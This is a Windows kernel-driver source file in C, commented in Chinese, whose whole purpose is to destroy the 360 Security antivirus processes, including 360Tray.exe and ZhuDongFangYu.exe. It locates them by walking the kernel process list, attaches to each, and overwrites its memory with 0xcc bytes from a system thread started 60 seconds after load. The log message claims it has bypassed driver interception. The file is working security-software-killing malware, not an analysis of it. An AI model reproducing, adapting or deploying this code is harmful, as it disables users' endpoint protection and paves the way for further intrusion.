
#include <ntifs.h>

///	内核函数声明
NTKERNELAPI
VOID
KeAttachProcess(
IN PRKPROCESS Process
);

NTKERNELAPI
VOID
KeDetachProcess(
VOID
);

NTSYSAPI
NTSTATUS
NTAPI
ZwQueryInformationProcess(
__in HANDLE ProcessHandle,
__in PROCESSINFOCLASS ProcessInformationClass,
__out_bcount(ProcessInformationLength) PVOID ProcessInformation,
__in ULONG ProcessInformationLength,
__out_opt PULONG ReturnLength
);



////	结构体
//PED和PTE的结构

//开启PAE版
typedef struct _MMPTE_HARDWARE_PAE {
	ULONGLONG Valid : 1;
	ULONGLONG Write : 1;        // UP version
	ULONGLONG Owner : 1;
	ULONGLONG WriteThrough : 1;
	ULONGLONG CacheDisable : 1;
	ULONGLONG Accessed : 1;
	ULONGLONG Dirty : 1;
	ULONGLONG LargePage : 1;
	ULONGLONG Global : 1;
	ULONGLONG CopyOnWrite : 1; // software field
	ULONGLONG Prototype : 1;   // software field
	ULONGLONG reserved0 : 1;  // software field
	ULONGLONG PageFrameNumber : 24;
	ULONGLONG reserved1 : 28;  // software field
} MMPTE_HARDWARE_PAE, *PMMPTE_HARDWARE_PAE;

typedef struct _MMPTE_PAE {
	union  {
		MMPTE_HARDWARE_PAE Hard;
	} u;
} MMPTE_PAE, *PMMPTE_PAE;

//未开启PAE版
typedef struct _MMPTE_HARDWARE {
	ULONG Valid : 1;
	ULONG Write : 1;       // UP version
	ULONG Owner : 1;
	ULONG WriteThrough : 1;
	ULONG CacheDisable : 1;
	ULONG Accessed : 1;
	ULONG Dirty : 1;
	ULONG LargePage : 1;
	ULONG Global : 1;
	ULONG CopyOnWrite : 1; // software field
	ULONG Prototype : 1;   // software field
	ULONG reserved : 1;    // software field
	ULONG PageFrameNumber : 20;
} MMPTE_HARDWARE, *PMMPTE_HARDWARE;

typedef struct _MMPTE {
	union  {
		MMPTE_HARDWARE Hard;
	} u;
} MMPTE, *PMMPTE;



////	宏
//获得PDE和PTE

#define PTE_BASE    0xC0000000
#define PDE_BASE    0xC0300000
#define PDE_BASE_PAE 0xc0600000

//开启PAE版
#define MiGetPdeAddressPae(va)   ((PMMPTE_PAE)(PDE_BASE_PAE + ((((ULONG)(va)) >> 21) << 3)))
#define MiGetPteAddressPae(va)   ((PMMPTE_PAE)(PTE_BASE + ((((ULONG)(va)) >> 12) << 3)))

//未开启PAE版
#define MiGetPdeAddress(va)  ((MMPTE*)(((((ULONG)(va)) >> 22) << 2) + PDE_BASE))
#define MiGetPteAddress(va) ((MMPTE*)(((((ULONG)(va)) >> 12) << 2) + PTE_BASE))

//win7 32位下ActiveProcessLinks的偏移
#define  ActiveProcessLinksOffset 0xB8
//进程名大小
#define  ProcessNameSize 0x260 
//目标进程名
//Tray有时会大小写
#define TargetProNameTarap L"360Tray.exe"
#define TargetProNametarap L"360tray.exe"
#define TargetProNameZDFY L"ZhuDongFangYu.exe"
#define TargetProNameHel L"360UHelper.exe"
#define TargetProNamesee L"360speedld.exe"


//开启PAE版
ULONG MmIsAddressValidExPae(
	IN PVOID Pointer
	)
{
	MMPTE_PAE* Pde;
	MMPTE_PAE* Pte;

	Pde = MiGetPdeAddressPae(Pointer);

	if (Pde->u.Hard.Valid)
	{
		//判断PDE大页情况
		if (Pde->u.Hard.LargePage != 0)		
		{
			Pte = Pde;
		}
		else
		{
			Pte = MiGetPteAddressPae(Pointer);
		}

		if (Pte->u.Hard.Valid)
		{
			return TRUE;
		}
	}
	return FALSE;
}


//未开启PAE版
ULONG MmIsAddressValidExNotPae(
	IN PVOID Pointer
	)
{
	MMPTE* Pde;
	MMPTE* Pte;

	Pde = MiGetPdeAddress(Pointer);

	if (Pde->u.Hard.Valid)
	{
		Pte = MiGetPteAddress(Pointer);

		if (Pte->u.Hard.Valid)
		{
			return TRUE;
		}

		//源码忽略PDE大页情况
	}

	return FALSE;
}



//判断地址是否有效
ULONG MiIsAddressValidEx(
	IN PVOID Pointer
	)
{
	//地址为空则无效
	if (!ARGUMENT_PRESENT(Pointer) ||
		!Pointer){
		return FALSE;
	}

	//// 页面检测
	//检测是否开启PAE
	ULONG uCR4 = 0;
	_asm{
		// mov eax, cr4
		__asm _emit 0x0F __asm _emit 0x20 __asm _emit 0xE0;
		mov uCR4, eax;
	}
	if (uCR4 & 0x20) {
		return MmIsAddressValidExPae(Pointer);
	}
	else {
		return MmIsAddressValidExNotPae(Pointer);
	}

	return TRUE;

	//此函数用于 同时判断内核对象地址是否有效。
	//对象的地址也是一个页面地址。

}



//ZeroProcessMemory：破环进程空间
BOOLEAN ZeroProcessMemory(ULONG EProcess)
{
	ULONG ulVirtualAddr;
	BOOLEAN b_OK = FALSE;
	PVOID OverlayBuf = NULL;

	//申请填满0xcc的覆盖空间
	OverlayBuf = ExAllocatePool(NonPagedPool, 0x1024);
	if (!OverlayBuf){
		return FALSE;
	}

	memset(OverlayBuf, 0xcc, 0x1024);

	//Attach进目标进程
	KeAttachProcess((PEPROCESS)EProcess); 

	//循环填充进程空间
	for (ulVirtualAddr = 0; ulVirtualAddr <= 0x7fffffff; ulVirtualAddr += 0x1024)
	{
		if (MiIsAddressValidEx((PVOID)ulVirtualAddr))
		{
			__try
			{
				//不可写会抛出异常
				ProbeForWrite((PVOID)ulVirtualAddr, 0x1024, sizeof(ULONG));
				RtlCopyMemory((PVOID)ulVirtualAddr, OverlayBuf, 0x1024);
				b_OK = TRUE;
			}
			__except (EXCEPTION_EXECUTE_HANDLER){
				continue;
			}
		}
		else{
			if (ulVirtualAddr > 0x1000000)  //填这么多足够破坏进程数据了
				break;
		}
	}

	//退出这个进程的空间
	KeDetachProcess();

	//释放申请的内存
	ExFreePool(OverlayBuf);

	////验证下是否结束了这个进程
	//这种方法并不可靠
	//Status = ObOpenObjectByPointer(
	//	(PEPROCESS)EProcess,
	//	OBJ_KERNEL_HANDLE,
	//	0,
	//	GENERIC_READ,
	//	NULL,
	//	KernelMode,
	//	&ProcessHandle
	//	);

	////进程还存在，结束失败
	//if (NT_SUCCESS(Status)){
	//	ZwClose(ProcessHandle);
	//	b_OK = FALSE;
	//}


	return b_OK;
}


//路径名解析出文件名
void splitname(const PWCHAR szPath,PWCHAR * szfilename)
{
	//从后遍历获得文件名

	ULONG i;

	i = 0;
	
	i = wcslen(szPath); 

	while (szPath[i] != (WCHAR)'\\')
		i--;

	i++;


	*szfilename = (PWCHAR)((ULONG)szPath + (i*2));
}


//通过进程链遍历进程
PEPROCESS GetEProcessByName(PUNICODE_STRING _ProcessName)
{
	NTSTATUS st = STATUS_UNSUCCESSFUL;
	HANDLE hPro = NULL;
	PEPROCESS FounPro = NULL;

	//从系统进程开始遍历
	PEPROCESS eProces = (PEPROCESS)IoGetCurrentProcess();

	//链表头结点
	PLIST_ENTRY ListHead = (PLIST_ENTRY)((ULONG)eProces + ActiveProcessLinksOffset);
	//下一结点
	PLIST_ENTRY Entry = ListHead->Flink;

	PUNICODE_STRING pPath = (PUNICODE_STRING)ExAllocatePool(NonPagedPool, ProcessNameSize);
	
	while (Entry != ListHead)
	{
		FounPro = (PEPROCESS)((ULONG)Entry - ActiveProcessLinksOffset);

		Entry = Entry->Flink;
		if (Entry == NULL)
		{
			KdPrint(("被断链了 \n"));
			break;
		}

		__try
		{

			RtlZeroMemory(pPath, ProcessNameSize);

			////获取稳定的进程名
			st = ObOpenObjectByPointer(FounPro, OBJ_KERNEL_HANDLE, NULL, 0, NULL, KernelMode, &hPro);
			if (!NT_SUCCESS(st))
			{
				FounPro = NULL;
				break;
			}

			ULONG OutSize = 0;
			st = ZwQueryInformationProcess(hPro, ProcessImageFileName, pPath, ProcessNameSize, &OutSize);
			if (!NT_SUCCESS(st))
			{
				FounPro = NULL;
				break;
			}

			//分离路径得文件名
			PWCHAR ProName = NULL;
			splitname(pPath->Buffer, &ProName);

			KdPrint((("进程名：%ws \n"), ProName));

			if (!wcscmp(_ProcessName->Buffer, ProName))
			{
				KdPrint(("找到了 \n"));
				break;
			}
		}
		__except (EXCEPTION_EXECUTE_HANDLER)
		{
			FounPro = NULL;
			continue;
		}

		FounPro = NULL;
	}

	ZwClose(hPro);
	ExFreePool(pPath);
	ObDereferenceObject(eProces);

	return FounPro;
}


////判断进程是否有效
//这是A-Protect的源码，但经测试并不可靠
//BOOLEAN IsExitProcess(PEPROCESS Eprocess)
//{
//	ULONG SectionObjectOffset = NULL;
//	ULONG SegmentOffset = NULL;
//	ULONG SectionObject;
//	ULONG Segment;
//	BOOLEAN b_OK = FALSE;
//
//	__try
//	{
//		//这里锁定Win7 7000 所以直接加偏移
//
//		if (MmIsAddressValidExPae(((ULONG)Eprocess + 0x128))){
//				SectionObject = *(PULONG)((ULONG)Eprocess + 0x128);
//
//				if (MmIsAddressValidExPae(((ULONG)SectionObject + 0x14))){
//					Segment = *(PULONG)((ULONG)SectionObject + 0x14);
//
//					if (MmIsAddressValidExPae(Segment)){
//						b_OK = TRUE;  //进程是有效的
//						__leave;
//					}
//				}
//			}
//		}
//	
//	__except (EXCEPTION_EXECUTE_HANDLER){
//		//接收异常
//	}
//	return b_OK;
//
//	//经测试，这种方式不可靠，因为有些存活进程的内存对象为NULL。
//}

////DPC回调
//已废
//VOID DpcForTimer(IN struct _KDPC  *Dpc, IN PVOID  DeferredContext,
//	IN PVOID  SystemArgument1, IN PVOID  SystemArgument2)
//{
//	UNREFERENCED_PARAMETER(Dpc);
//	UNREFERENCED_PARAMETER(DeferredContext);
//	UNREFERENCED_PARAMETER(SystemArgument1);
//	UNREFERENCED_PARAMETER(SystemArgument2);
//
//	_asm int 3;
//	//360Trap
//	GetProNameToKillProcess(TargetProNameTarap);
//
//	//360trap
//	GetProNameToKillProcess(TargetProNametarap);
//
//	//ZhuDongFangYu
//	GetProNameToKillProcess(TargetProNameZDFY);
//
//	//360UHelper.exe
//	GetProNameToKillProcess(TargetProNameHel);
//}

BOOLEAN GetProNameToKillProcess(PWCHAR ProName)
{
	//根据进程名得到EPROCESS
	UNICODE_STRING UName = RTL_CONSTANT_STRING(ProName);
	PEPROCESS eProcess = GetEProcessByName(&UName);
	if (eProcess != NULL)
	{
		if (ZeroProcessMemory((ULONG)eProcess))		//	破环进程空间
		{
			KdPrint((("成功干掉 %ws \n"), ProName));
			return TRUE;
		}
	}
	return FALSE;
}

//创建线程等待
NTSTATUS ThreadProc()
{
	//等待360相关进程创建  60秒
	//时间换算
	LARGE_INTEGER interval;
	interval.QuadPart = (-10 * 1000);
	interval.QuadPart *= 1000 * 60;
	KeDelayExecutionThread(KernelMode, FALSE, &interval);

		//_asm int 3;

		//360UHelper.exe
		GetProNameToKillProcess(TargetProNameHel);

		//360UHelper.exe
		GetProNameToKillProcess(TargetProNamesee);

		//ZhuDongFangYu
		GetProNameToKillProcess(TargetProNameZDFY);

		//360Trap
		GetProNameToKillProcess(TargetProNameTarap);
	
		//360trap
		GetProNameToKillProcess(TargetProNametarap);
	
	// 退出线程   
	PsTerminateSystemThread(STATUS_SUCCESS);
}

NTSTATUS UnLoadDriver(PDRIVER_OBJECT DriverObject)
{
	UNREFERENCED_PARAMETER(DriverObject);
	return STATUS_SUCCESS;
}

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegisterPath)
{
	UNREFERENCED_PARAMETER(RegisterPath);
	DriverObject->DriverUnload = UnLoadDriver;

	//打印信息
	//_asm int 3;
	KdPrint(("成功绕过驱动拦截"));


	////等待360相关进程创建  60秒
	////时间换算
	//会黑屏
	//LARGE_INTEGER interval;
	//interval.QuadPart = (-10 * 1000);
	//interval.QuadPart *= 1000 * 60;
	//KeDelayExecutionThread(KernelMode, FALSE, &interval);

	//////等待360相关进程创建  60秒
	////设置DPC定时器
	////在DPC内由于IRQL不能使用ObOpenObjectByPointer等函数。
	//PKTIMER pktimer = (PKTIMER)ExAllocatePoolWithTag(NonPagedPool, sizeof(KTIMER), 'RM');
	//PKDPC pKdpc = (PKDPC)ExAllocatePoolWithTag(NonPagedPool, sizeof(KDPC), 'RM');
	//KeInitializeDpc(pKdpc, (PKDEFERRED_ROUTINE)DpcForTimer, NULL);
	//KeInitializeTimerEx(pktimer, NotificationTimer);
	//
	//LARGE_INTEGER settime = { 0 };
	//settime.QuadPart = 60 * 1000000 * -10;
	//KeSetTimer(pktimer, settime, pKdpc);

	//等待360相关进程创建  60秒
	//创建线程并等待
	HANDLE hThread = NULL;
	PsCreateSystemThread(&hThread, THREAD_ALL_ACCESS, NULL, NULL, NULL, ThreadProc, NULL);
	
	ZwClose(hThread);
	return STATUS_SUCCESS;
}